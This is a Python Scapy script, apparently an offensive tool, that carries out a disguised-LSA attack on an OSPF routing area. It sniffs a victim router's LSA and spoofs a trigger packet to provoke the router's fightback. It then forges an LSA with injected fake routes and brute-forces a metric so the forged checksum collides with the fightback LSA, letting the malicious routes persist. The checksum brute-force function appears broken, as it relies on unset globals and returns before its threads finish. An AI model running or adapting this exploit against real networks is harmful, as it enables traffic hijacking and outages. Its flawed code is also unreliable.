#! /usr/bin/env python

"""
This script is used to attack an OSPF router area with a disguised Router LSA message.

There are 4 arguments to pass to the script, explained in detail below.

### Victim router
This router receives a "trigger" package; this is used to trigger the fightback mechanism,
while sending the disguised package at the same time. In this way, the generated fightback
package arrives to the other router too late, and it is discarded because seen as "too old",
when compared to the disguised one. On the other hand, the victim router does not verify if
the fightback package is accepted or not and hence it does not send any new LSA, until
the current one expires (normally, on Cisco device, LSAs expire after 30 minutes).

### Neighbor router
First of all, in this case the "neighbor" is refered to the neighbor defined inside the
victim's router configuration (this is one of the neighbor of the victim router).
This router is the target of the disguised LSA package. In theory, it could be a multicast
address, but in reality this is not the case: in fact, if the neighbor router receives
both the trigger packet and the disguised packet (because both are sent to the multicast
address), the disguised one is discarted, due to the "hold timer". If you try, the router
receives:
- the trigger packet
- the disguised packet
- the fightback packet

The first is accepted, while the second and the third packets are discarted. Then, the neighbor
router sends out an LSAcknowledge to the victim router, with an ACK for the first packet. When
the victim router receives it, it sends out, once again, the fightback packet (because the LSAck
refers to the trigger packet, which has a sequence number smaller, by one, if compared to the fightback
sequence number), overwriting anything on the whole OSPF area.

### Interface
This is the network interface to use for sniffing and for sending both the trigger and the disguised
packets.

### Sample command
./ospf-disguised-lsa.py -v 172.16.22.5 -n 172.16.22.2 -i eth2
"""

import sys
import argparse

"""
Import Scapy avoiding error printing on the console.
"""
sys.stderr = None
from scapy.all import *
sys.stderr = sys.__stderr__

#####################################################
# Utils functions		 							#
#####################################################

"""
Checks if the incoming packet is an OSFP LS Update packet
sent from the victim router.
"""
def check_incoming_packet(victim, pkt):
	if OSPF_Router_LSA in pkt:
		for lsa in pkt[OSPF_LSUpd].lsalist:
			if OSPF_Router_LSA in lsa:
				if lsa[OSPF_Router_LSA].adrouter == victim and pkt[IP].src == victim:
					return True
	return False

"""
Returns the position of the victim router LSA taken from the originally captured packet
"""
def get_victim_lsa_index(victim_ip, pkt):
	position = 0
	if OSPF_Router_LSA in pkt:
		for lsa in pkt[OSPF_LSUpd].lsalist:
			if OSPF_Router_LSA in lsa:
				if lsa[OSPF_Router_LSA].adrouter == victim_ip:
					break
				position += 1
	return position

"""
This function calculates the value of the first and the second byte in the
OSPF Link "metric" field, used to fake the checksum.
"""
class bruteThread(threading.Thread):
    threadKiller = None # this variable gets set if value is found
    threadCounter = 0   # variable used to keep count of what thread finds the value

    def __init__(self, first, last, name="bruteThread"):  # setup thread
        super().__init__()                                # call parent class __init__
        bruteThread.threadCounter += 1                    # increase thread counter
        self.counter = bruteThread.threadCounter          # assign number to current thread
        self.first = first                                # initialize range variables 1/2
        self.last  = last                                 # initialize range variables 2/2
        print("Thread #{0} started".format(bruteThread.threadCounter))

    def run(self):
        global fightback_lsa
        global evil_lsa
        global linkcount
        global rightMetric

        self.tmp_lsa = evil_lsa[OSPF_Router_LSA].copy()
        self.fightback_checksum = ospf_lsa_checksum(fightback_lsa.build())

        for metric in range (self.first, self.last):
            self.tmp_lsa[OSPF_Router_LSA].linklist[linkcount].metric = metric
            self.tmp_checksum = ospf_lsa_checksum(self.tmp_lsa.build())

            if self.tmp_checksum == self.fightback_checksum:
                bruteThread.threadKiller = self.counter   # set threadKiller with current thread number
                print("Value found!")
                rightMetric = metric # update rightMetric with metric value
                exit()

            if bruteThread.threadKiller is not None:      # kill the thread if value is foundin another one
                print("Killing thread #{0} because value was found by thread #{1}"
                      "".format(self.counter, bruteThread.threadKiller))
                exit()

def get_fake_metric_value(fightback_lsa, evil_lsa, linkcount):

    rightMetric  = None # value of the metric that creates a collision
    threadNumber = 4    # number of threads to spawn
    first = 0           # beginning of the range
    for counter in range(threadNumber): # dynamically change threads' range in order to split it up in 4 parts
        t = bruteThread(first, int(65535*(counter+1)/threadNumber)) # create thread object
        first = int(65536*(counter+1)/threadNumber) + 1
        t.start() # run thread
    return rightMetric



if __name__ == '__main__':

	"""
    Load the Scapy's OSPF module
    """
	load_contrib("ospf")

	"""
	Getting arguments from the command line
	"""
	parser = argparse.ArgumentParser()
	parser.add_argument("-v", "--victim_ip", help="[mandatory] The interface IP address of the victim router")
	parser.add_argument("-n", "--neighbor_ip", help="[mandatory] The IP to send the disguised LSA to (the neighbor of the victim router)")
	parser.add_argument("-i", "--iface", help="[mandatory] The interface to use for sniffing and sending packets")

	args = parser.parse_args()

	if 	(args.victim_ip == None or
		args.iface == None or
		args.neighbor_ip == None):
		
		parser.print_help()
		sys.exit(1)
	
	#####################################################
	# Initial configuration 							#
	#####################################################

	"""
	This is the IP address of the router we want to "spoof" (the one which receives the trigger packet).
	"""
	victim_ip = args.victim_ip

	"""
	This is the IP address of a neighbor of the victim router, to which the disguised LSA is sent.
	"""
	
	neighbor_ip = args.neighbor_ip

	"""
	This is the interface to use for both sniffing and sending packets.
	"""
	iface = args.iface

	print("[+] Staring sniffing for LSUpdate from the victim's router...")

	#####################################################
	# Sniffing for the original package					#
	#####################################################

	"""
	Sniff all the OSFP packets and stop when the first OSPF Router LSA is received.
	"""
	pkts = sniff(filter="proto ospf", iface=iface, stop_filter=lambda x: check_incoming_packet(victim_ip, x))

	"""
	Get the last packet and copy it.
	"""
	pkt_orig = pkts[-1].copy()

	#####################################################
	# Prepare the triggering packet 					#
	#####################################################

	print("[+] Preparing trigger packet...")

	"""
	We prepare an ad-hoc trigger packet, containing only one Router LSA: this is
	taken from the original package sent by the victim router.
	"""
	pkt_trig = pkts[-1].copy()
	victim_lsa_index = get_victim_lsa_index(victim_ip, pkt_orig)

	"""
	To be effective, the sequence of the LSA has to be increased by 1.
	"""
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].seq += 1
	
	"""
	Here we insert a random link, just to create an LSUpdate which seems advertised
	by the victim router, but which contains fake information. This will force the
	victim router to trigger the fightback mechanism.
	"""
	trigger_link = OSPF_Link(	metric=1,
								toscount=0,
								type=3,
								data= "255.255.255.0",
								id= "172.16.66.0")

	"""
	Addition of the triggering OSPF Link in the trigger packet.
	"""
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist.extend(trigger_link)

	"""
	Compliance of the packet (increase size + nb link).
	"""
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += 12
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount = len(pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)

	"""
	Adjust source and destination MAC addresses...
	"""
	pkt_trig[Ether].src = None
	pkt_trig[Ether].dst = None

	"""
	Now that the packet is ready, we let Scapy recalculate length, checksums, etc..
	Moreover, we update the source and destionatio IPs, and the source IP in the OSPF
	header.
	"""
	pkt_trig[IP].src = neighbor_ip
	pkt_trig[IP].dst = victim_ip
	pkt_trig[IP].chksum = None
	pkt_trig[IP].len = None
	pkt_trig[OSPF_Hdr].src = neighbor_ip
	pkt_trig[OSPF_Hdr].chksum = None
	pkt_trig[OSPF_Hdr].len = None
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len = None
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].chksum = None

	#####################################################
	# Prepare the disguised packet 						#
	#####################################################

	print("[+] Preparing disguised packet...")

	"""
	Get a fresh copy of the original packet.
	"""
	pkt_evil = pkts[-1].copy()

	"""
	Generate the disguised LSA. This is an example, change it accordingly to your
	goal.
	"""
	malicious_link = OSPF_Link(	metric=1,
								toscount=0,
								type=3,
								data= "255.255.255.0",
								id= "172.16.254.0")

	"""
	Addition of the malicious OSPF Link in the LSA_disguised packet.
	"""
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist.extend(malicious_link)

	"""
	Compliance of the packet (increase size + nb link).
	"""
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += 12
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount = len(pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)

	"""
	The sequence number of the packet evil is incremented by 2 because
	the trigger sequence is equal to the original packet sequence, plus one.
	It then triggers the fightback mechanism, which produces a packet with
	the sequence number equal to the trigger's sequence number, plus one.
	"""
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].seq += 2

	#####################################################
	# Calculate the disguised packet 					#
	#####################################################

	print("[+] Let's bruteforce the checksum!")

	"""
	Preparing the OSPF Link to fake the checksum.
	"""
	checksum_link = OSPF_Link(	metric=0,
								toscount=0,
								type=3,
								data= "255.255.255.0",
								id= "172.16.253.0")

	"""
	Addition of an OSPF Link in the LSA_disguised packet in order to change the checksum later.
	"""
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist.extend(checksum_link)

	"""
	Compliance of the packet (increase size + nb link).
	"""
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += 12
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount = len(pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)

	"""
	ORIGINAL SOLUTION:
	Get the value to modify the dummy link in order to have the same checksum as the fight back
	index of the dummy link - "metric":[1], "Tos":[3], "type":[4], "link_data":[5,6,7,8], "DR":[9,10,11,12]
	For example ind = [1,4], val = [49,12] -> metric = 49 and type =12

	IMPROVED SOLUTION:
	Due to the fact that the metric is 2 bytes long and that C0 and C1 are always evaluated as mod(255),
	there is no need to change all the other parameters.
	"""
	count = pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount - 1

	pkt_orig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].seq += 2

	faked_metric =  get_fake_metric_value(pkt_orig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA], pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA], count)
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist[count][OSPF_Link].metric = faked_metric

	print("[+] Collision found! Time to send the pkts...")
	
	"""
	Now that the packet is ready, we let Scapy recalculate length, checksums, etc..
	"""

	pkt_evil[IP].src = victim_ip
	pkt_evil[IP].dst = neighbor_ip
	pkt_evil[IP].chksum = None
	pkt_evil[IP].len = None
	pkt_evil[OSPF_Hdr].chksum = None
	pkt_evil[OSPF_Hdr].len = None
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].chksum = None

	"""
	Send original packet to trigger the fightback mechanism and the disguised LSA package.
	"""
	sendp([pkt_trig,pkt_evil], iface=iface)
